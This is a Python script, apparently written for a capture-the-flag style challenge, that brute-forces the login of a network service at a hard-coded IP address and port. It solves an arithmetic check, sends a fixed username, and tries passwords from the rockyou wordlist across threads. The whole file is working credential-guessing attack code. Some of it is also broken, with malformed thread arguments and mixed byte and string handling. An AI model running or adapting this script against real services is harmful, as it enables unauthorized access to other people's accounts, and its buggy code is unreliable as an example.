import socket
import re
import operator
import threading


host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file


def create_threads(passwords,thread_num):
	p_len = len(passwords)
	t_len = p_len//thread_num
	split_points = []
	for n in range(thread_num):
		if n == thread_num-1:
			split_points.append((n*t_len,p_len-1))
		else:
			split_points.append((n*t_len,(n+1)*t_len-1))

	print(p_len)
	print("=====")
	print(split_points)


	thread_list = [threading.Thread(target=run_brute_force,
		args=(
            passwords[split_point[0] : split_point[1]]
        )
    ) for split_point in split_points]

	return thread_list

def run_brute_force(passwords):
	global pw_find

	for pw in passwords:
		if pw_find:
			break
		else:
			if brute_force(pw.rstrip()):
				pw_find = True

def brute_force(pw):
	file = open(wordlist,"r")
	username = "ejnorman84"
	regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }


	print(" Trying Passowrd: " + pw)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	d1 = str(s.recv(1024))

	while re.search(regex,d1) == None:
		d1 = s.recv(1024)

	print("======data=====")
	print("|"+d1+"|")
	print("======end=====")

	m = re.search(regex,d1)
	firstNum = int(m.group('firstNum'))
	secNum = int(m.group('secNum'))
	op = m.group('op')
	res = str(ops[op](firstNum,secNum))
	print("answr is " + res)
	s.send(res+"\n")
	d2 = s.recv(1024)
	while d2 == "\n":
		d2 = s.recv(1024)
	print("d2 is " + d2)

	s.send(username + "\n")
	d3 = s.recv(1024)
	while d3 == "\n":
		d3 = s.recv(1024)
	print("d3 is " + d3)

	s.send(pw + "\n")
	d4 = s.recv(1024)
	while d4 == "\n":
		d4 = s.recv(1024)

	print("d4 result is " + d4)
	s.close()
	print("++++s closed++++")
	if not "Fail" in d4:
		print("SUCCESS")
		print("PASSWORD: " + pw)
		return True
	else:
		return False



		

if __name__ == '__main__':
	
	 brute_force("233")
